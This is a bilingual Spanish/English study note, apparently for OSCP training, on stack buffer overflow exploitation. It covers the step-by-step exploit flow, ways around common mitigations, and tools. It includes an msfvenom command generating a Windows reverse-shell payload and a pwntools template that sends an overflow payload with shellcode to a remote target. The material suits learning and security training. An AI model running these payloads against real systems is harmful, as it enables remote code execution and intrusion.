---
aliases:
  - BoF
  - Stack Buffer Overflow
tags:
  - technique/exploitation
kind: Concept
linked:
---
# Buffer Overflow

> [!info]
> Escritura más allá del buffer asignado en stack/heap, sobreescribiendo memoria adyacente. Vector clásico para hijack control de ejecución (EIP/RIP). OSCP-relevant aunque legacy en modern targets con mitigations.

***

## Stack overflow flow (clásico)

1. **Fuzz** → identificar input que crash el binary
2. **Crash analysis** → confirmar EIP overwrite con pattern (`pattern_create` / `pattern_offset`)
3. **Offset** → calcular cuántos bytes hasta EIP
4. **Bad chars** → enumerar bytes que el binary corrompe (`\x00`, `\x0a`, etc.)
5. **Find JMP ESP** → instrucción en módulo sin ASLR (`!mona modules`, `!mona find -s "\xff\xe4"`)
6. **Generate shellcode** → `msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y -b "\x00\x0a" -f c`
7. **Build exploit** → `padding + JMP_ESP_addr + NOPs + shellcode`
8. **Pwn**

***

## Mitigations modernas

| Mitigation | Bypass |
|---|---|
| **ASLR** | Leak puntero, partial overwrite, ROP via non-randomized module |
| **DEP / NX** | ROP (Return-Oriented Programming) |
| **Stack Canaries** | Leak canary, brute-force (fork-without-exec) |
| **CFG / CET** | Hard bypass; requiere chains específicos |
| **SafeSEH / SEHOP** (Win) | Overwrite handler en chain validation gap |

***

## Tools

- **Immunity Debugger** + **mona.py** — Windows BoF training
- **GDB** + **pwndbg** / **GEF** — Linux exploit dev
- **pwntools** — Python framework
- **ROPgadget** / **ropper** — ROP gadget finder
- **msfvenom** — shellcode gen
- **AFL/AFL++** — fuzzing

***

## Patterns relevantes

```python
# pwntools template
from pwn import *
context.arch = 'i386'
p = remote('target', 1337)
payload = b'A' * 268 + p32(0x625011AF) + b'\x90' * 16 + shellcode
p.sendline(payload)
p.interactive()
```

***

## Notas Relacionadas

- [[MSFVenom]]
- [[Reflective PowerShell Shellcode Runner]]
- [[searchsploit]]
